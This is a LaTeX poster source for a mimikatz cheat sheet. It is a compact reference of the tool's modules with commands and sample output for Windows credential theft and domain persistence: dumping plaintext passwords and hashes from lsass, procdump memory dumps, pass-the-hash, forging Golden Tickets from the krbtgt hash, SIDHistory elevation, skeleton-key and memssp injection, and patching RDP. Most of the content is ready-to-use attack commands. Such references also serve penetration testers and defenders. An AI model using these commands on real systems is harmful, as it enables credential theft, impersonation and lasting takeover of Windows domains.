@@ -1,0 +1,278 @@
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+% MIMIKatz Cheat Sheet
+%
+% Edited by Nicholas Brink nic@brinksite.com
+%
+% baposter Landscape Poster
+% This template has been downloaded from:
+% http://www.LaTeXTemplates.com
+% 
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+%----------------------------------------------------------------
+%	PACKAGES AND OTHER DOCUMENT CONFIGURATIONS
+%----------------------------------------------------------------
+
+\documentclass[landscape,a0paper,fontscale=0.285]{baposter} % Adjust the font scale/size here
+ \title{MIMIKatz Cheat Sheet New}
+\usepackage[english]{babel}
+\usepackage[utf8]{inputenc}
+
+\usepackage{graphicx} % Required for including images
+\graphicspath{{figures/}} % Directory in which figures are stored
+
+\usepackage{xcolor}
+\usepackage{colortbl}
+\usepackage{tabu}
+
+\usepackage{mathtools}
+%\usepackage{amsmath} % For typesetting math
+\usepackage{amssymb} % Adds new symbols to be used in math mode
+
+\usepackage{booktabs} % Top and bottom rules for tables
+\usepackage{enumitem} % Used to reduce itemize/enumerate spacing
+\usepackage{palatino} % Use the Palatino font
+\usepackage[font=small,labelfont=bf]{caption} % Required for specifying captions to tables and figures
+
+\usepackage{multicol} % Required for multiple columns
+\setlength{\columnsep}{1.5em} % Slightly increase the space between columns
+\setlength{\columnseprule}{0mm} % No horizontal rule between columns
+
+\usepackage{tikz} % Required for flow chart
+\usepackage{hyperref} % Required for URLS
+\usepackage{listings} % Required for listings
+\usepackage{verbatim} %required for code sections
+\usetikzlibrary{decorations.pathmorphing}
+\usetikzlibrary{shapes,arrows} % Tikz libraries required for the flow chart in the template
+
+\newcommand{\compresslist}{ % Define a command to reduce spacing within itemize/enumerate environments, this is used right after \begin{itemize} or \begin{enumerate}
+\setlength{\itemsep}{1pt}
+\setlength{\parskip}{0pt}
+\setlength{\parsep}{0pt}
+}
+\definecolor{orange}{RGB}{255,127,0}% Defines the color used for content box headers
+ %\definecolor{lightblue}{rgb}{0.145,0.6666,1} 
+
+\begin{document}
+
+\begin{poster}
+{
+headerborder=closed, % Adds a border around the header of content boxes
+colspacing=0.8em, % Column spacing
+bgColorOne=white, % Background color for the gradient on the left side of the poster
+bgColorTwo=white, % Background color for the gradient on the right side of the poster
+borderColor=orange, % Border color
+headerColorOne=black, % Background color for the header in the content boxes (left side)
+headerColorTwo=orange, % Background color for the header in the content boxes (right side)
+headerFontColor=white, % Text color for the header text in the content boxes
+boxColorOne=white, % Background color of the content boxes
+textborder=roundedleft, % Format of the border around content boxes, can be: none, bars, coils, triangles, rectangle, rounded, roundedsmall, roundedright or faded
+eyecatcher=true, % Set to false for ignoring the left logo in the title and move the title left
+headerheight=0.1\textheight, % Height of the header
+headershape=roundedright, % Specify the rounded corner in the content box headers, can be: rectangle, small-rounded, roundedright, roundedleft or rounded
+headerfont=\Large\bf\textsc, % Large, bold and sans serif font in the headers of content boxes
+%textfont={\setlength{\parindent}{1.5em}}, % Uncomment for paragraph indentation
+linewidth=2pt % Width of the border lines around content boxes
+}
+%----------------------------------------------------------------
+%	Title
+%----------------------------------------------------------------
+{\bf\textsc{mimikatz Cheat Sheet}\vspace{0.5em}} % Poster title
+{\textsc{\{ m i m i k a t z \ \ \ \ \ C h e a t \ \ \ \ \ S h e e t\} \hspace{12pt}}}
+{\textsc{A little tool to play with Windows Security \\ (V1.1 edited by: Nicholas Brink) \hspace{12pt}}} 
+
+%------------------------------------------------
+% Introduction
+%------------------------------------------------
+\headerbox{Mimikatz Overview:}{name=objectives,column=0,row=0}{
+
+%-------Purpose-------------------------------
+\colorbox[HTML]{FFE4B5}{\makebox[\textwidth-2\fboxsep][l]{\bf  - Purpose}}
+\textbf{mimikatz} is a tool developed by Benjamin Delpy to extract plaintext passwords, hashes, PIN codes, kerberos tickets from memory. It can also be used to perform pass-the-hash, pass-the-ticket, and build Golden Tickets.\\  
+\\
+\textbf{mimikatz} can be downloaded from github:\\
+\url{https://github.com/gentilkiwi/mimikatz}
+
+Command Overview: \\
+\hspace*{1cm}List Modules: \textit{:: [enter]} \\
+\hspace*{1cm}List Commands: \textit{<modulename>:: } \\
+\hspace*{0cm}Basic Syntax: \textit{<modulename>::<command> <args>} 
+\\
+\\
+\\
+%-------Modules-------------------------------
+\colorbox[HTML]{FFE4B5}{\makebox[\textwidth-2\fboxsep][l]{\bf  - Modules}} \linebreak
+\centering{\textbf{mimikatz} V2.1 currently has 20 modules \\
+\begin{tabular}{|l|p{4.75cm}| }
+\hline
+\multicolumn{2}{|c|}{\textbf{mimikatz Modules}} \\
+\hline
+\hspace*{.5cm}Name &  \hspace*{1.0cm}Description\\
+\hline
+standard & Basic commands\\
+crypto & Info about providers\\
+sekurlsa &  Enumerate credentials\\
+kerberos & Kerberos ticket functions\\
+privilege & Request rights (i.e. debug)\\
+process & Interact with system processes\\
+service & Interact with system services\\
+lsadump & LSA: dcsync, netsync, sam, secrects\\
+ts & Patch Terminal Server to allow multiple users\\
+event & drop|clear Windows event log\\
+misc & cmd, regedit, taskmgr, memssp, skeleton\\
+token & Manipulate identity tokens\\
+vault & Windows Credential Manager\\
+minesweeper & Cheat at Minesweeper\\
+net & user, group and alias info\\
+dpapi & Data protection application programming interface\\
+busylight & Control Kuando Busylight Device\\
+sysenv & Interact with system enviroment variables\\
+sid & Interact with Security Identifiers\\
+iis & Analyze IIS .config files\\
+\hline
+\end{tabular}
+}
+%end of centering
+}
+
+
+%------------------------------------------------
+% Credentials
+%------------------------------------------------
+\headerbox{Credentials}{name=introduction,column=1,row=0,bottomaligned=objectives}{
+%------Priviledges--------
+\colorbox[HTML]{FFE4B5}{\makebox[\textwidth-2\fboxsep][l]{\bf - Privileges and Logging}}
+\textbf{mimikatz} requires debug privileges which allows mimikatz to attach to the lsass process.  By default debug is granted to all administrators.  If debug permissions have been removed try: \textit{psexec -s -c mimikatz.exe} to run as the system user.\\
+\hspace*{.25cm}\textit{mimikatz \# privilege::debug \\\hspace*{1.25cm}\textbf{ Privilege '20' OK}} \\
+Some features may require the use of \textbf{SYSTEM} privileges:\\
+\hspace*{.25cm}\textit{mimikatz \# token::elevate \\\hspace*{1.25cm}\textbf{Token Id  : 0
+\\\hspace*{1.25cm}User name :
+\\\hspace*{1.25cm}SID name  : NT AUTHORITY\textbackslash SYSTEM }} \\
+Create a log of all the mimikatz output (default log name is "mimikatz.log"):\\
+\hspace*{.25cm}\textit{mimikatz \# standard::log \textbf{optional-log-name} \\\hspace*{1.25cm}\textbf{ Using 'mimikatz.log' for logfile : OK}} \\
+%------Plain Text Creds--------
+\colorbox[HTML]{FFE4B5}{\makebox[\textwidth-2\fboxsep][l]{\bf - Dump Plaintext Credentials}}
+%\textbf{mimikatz}
+
+Create a log of all the mimikatz output (default log name is "mimikatz.log"):\\
+
+\hspace*{.25cm}\textit{mimikatz \# sekurlsa::logonPasswords \\\hspace*{1.25cm}\textbf{Authentication Id : 0 ;\\
+\hspace*{1.25cm}Session           : Interactive from 1\\
+\hspace*{1.25cm}User Name         : USERNAME\\
+\hspace*{1.25cm}Domain            : DOMAIN\\
+\hspace*{1.25cm}Logon Server      : LastDomainController\\
+\hspace*{1.25cm}Logon Time        : 1/1/1970 9:30:47 AM\\
+\hspace*{1.25cm}SID               : S-1-5-21-***}} \\
+%------Cred Manager & Windows Vault--------
+\colorbox[HTML]{FFE4B5}{\makebox[\textwidth-2\fboxsep][l]{\bf - Additional Creds \& Keys}}
+Additional creds are maintained by the Windows Credential Manager, Windows Vault and SAM:\\
+\begin{tabular}{|l|p{4.25cm}| }
+\hline
+\hspace*{.5cm}Name &  \hspace*{1.0cm}Description\\
+\hline
+vault::cred & Credential Manager Creds\\
+vault::list & Windows Vault Creds\\
+lsadump::sam &  Key to decrypt SAM\\
+lsadump::secrets & Key to decrypt SECRETS\\
+lsadump::cache & Key to decrypt MSCache(v2)\\
+\hline
+\end{tabular}
+%------Dump File--------
+\colorbox[HTML]{FFE4B5}{\makebox[\textwidth-2\fboxsep][l]{\bf - Dump File}}
+\textbf{mimikatz} can make use of the dump of an lsass process using \textbf{procdump}:\\
+\hspace*{.25cm}\textit{procdump.exe -ma lsass.exe minidump.dmp 2>\&1}
+This can then be read into \textbf{mimikatz}:\\
+\hspace*{.25cm}\textit{mimikatz \# sekurlsa::minidump minidump.dmp}
+
+}
+
+%------------------------------------------------
+% Impersonation
+%------------------------------------------------
+\headerbox{Impersonation}{name=results,column=2,row=0,bottomaligned=objectives}{
+
+%---------------------------------------------
+
+%------Pass the hash--------
+\colorbox[HTML]{FFE4B5}{\makebox[\textwidth-2\fboxsep][l]{\bf - Pass the Hash}}
+\textbf{mimikatz} can create a process running under another users credential using the HASH of a password instead of the real password.
+\begin{itemize}\compresslist
+\item/user - the username to impersonate
+\item/domain - the FQDN - if local user/admin, use computer or server name
+\item/rc4 or /ntlm - optional - the RC4 key / NTLM hash of the user's password
+\item/aes128 - optional - the AES128 key derived from the user's password and the realm of the domain
+\item/aes256 - optional - the AES256 key derived from the user's password and the realm of the domain
+\item/run - optional - the command line to run - default is: cmd to have a shell.
+\item/impersonate - optional - 
+\end{itemize}
+\hspace*{.25cm}\textit{mimikatz \# sekurlsa::pth /user:imauser\\ /domain:domain.net /ntlm:b8e... /run:"powershell" \\\hspace*{1.25cm}\textbf{user : imauser\\
+\hspace*{1.25cm}Domain : domain.net\\
+\hspace*{1.25cm}program: powershell \\
+\hspace*{1.25cm}...}} \\
+%------Golden Ticket--------
+\colorbox[HTML]{FFE4B5}{\makebox[\textwidth-2\fboxsep][l]{\bf - Golden Ticket}}
+The domain name, domain SID, account name, account RID, RID's for group membership and an RC4(NTLM Hash) key, AES128 HMAC Key, or AES256 HMAC key. \textbf{mimikatz} on a DC:\\
+\hspace*{.25cm}\textit{mimikatz \# lsadump::lsa /inject /name:krbtgt \\\hspace*{1.25cm}\textbf{EXTENDED OUTPUT}}\\
+To generate the ticket and save for later use:\\
+\hspace*{.25cm}\textit{mimikatz \# kerberos:purge}\\
+\hspace*{.25cm}\textit{mimikatz \# kerberos::golden /domain:domain.net\\ /sid:S-1-5-21... /rc4:8ad3... /user:Administrator\\ /id:500 /groups:500,501,513 /ticket:forged.kirbi}\\
+\hspace*{.25cm}\textit{mimikatz \# kerberos::ptt forged.kirbi}\\
+Once imported, issue \textbf{misc::cmd} to use
+\\
+%------------------------------------------------
+\colorbox[HTML]{FFE4B5}{\makebox[\textwidth-2\fboxsep][l]{\bf - Elevate Privileges}} \\
+The \textbf{misc::addsid} command adds a sid to the \textbf{SIDHistory} of an account. By choosing a domain admin you effectively elevate a user account to domain admin\\
+\hspace*{.25cm}\textit{mimikatz \# misc::addsid normuser domainadmin} \\
+}
+%------------------------------------------------
+% Misc
+%------------------------------------------------
+\headerbox{Miscellaneous}{name=results,column=3,row=0,bottomaligned=objectives}{
+%---------------------------------------------
+\colorbox[HTML]{FFE4B5}{\makebox[\textwidth-2\fboxsep][l]{\bf - MultiRDP}} \\
+The \textbf{ts} module patches "termsrv.dll" in memory to allow for additional RDP sessions.\\ 
+\hspace*{.25cm}\textit{mimikatz \# ts::multirdp \\\hspace*{1.25cm}\textbf{"TermService" service patched}} \\
+%------------------------------------------------
+\colorbox[HTML]{FFE4B5}{\makebox[\textwidth-2\fboxsep][l]{\bf - SkeletonKey}} \\
+The \textbf{misc::skeleton} command patches "lsass" in memory on a domain controller to create a skeleton password of "mimikatz" for any domain user. A reboot of the DC is required to revert this. 
+\hspace*{.25cm}\textit{mimikatz \# misc::skeleton} \\
+
+%------------------------------------------------
+\colorbox[HTML]{FFE4B5}{\makebox[\textwidth-2\fboxsep][l]{\bf - MEMSSP}} \\
+\textbf{misc::memssp} adds an Security Support Provider (SSP) in memory on the local system to gather credentials of users that log in.  By default they are written to a file in the same directory as the driver.\\ 
+\hspace*{.25cm}\textit{mimikatz \# misc::memssp \\\hspace*{1.25cm}\textbf{Injected =>}} \\
+%------------------------------------------------
+\colorbox[HTML]{FFE4B5}{\makebox[\textwidth-2\fboxsep][l]{\bf - Kernel Commands}} \\
+\centering{\textbf{mimikatz} has additional commands that can be called by prefixing them with "!" \\
+\begin{tabular}{|l|p{4.4cm}| }
+\hline
+\multicolumn{2}{|c|}{\textbf{! Commands}} \\
+\hline
+\hspace*{.5cm}Name &  \hspace*{1.0cm}Description\\
+\hline
++ & Install driver (mimidrv)\\
+- & Remove driver (mimidrv)\\
+ping & Ping the driver\\
+bsod & BSOD !\\
+process & List process\\
+processProtect & Protect process\\
+processToken & Duplicate process token\\
+processPrivilege & Set all privilege on process\\
+modules & List modules\\
+ssdt & List SSDT\\
+notifProcess & List process notify callbacks\\
+notifThread & List thread notify callbacks\\
+notifImage & List image notify callbacks\\
+notifReg & List registry notify callbacks\\
+notifObject & List object notify callbacks\\
+filters & List FS filters\\
+minifilters & List minifilters\\
+sysenvset & System Environment Variable Set\\
+sysenvdel & System Environment Variable Delete\\
+\hline
+\end{tabular}
+\\
+}
+}
+\end{poster}
+\end{document}
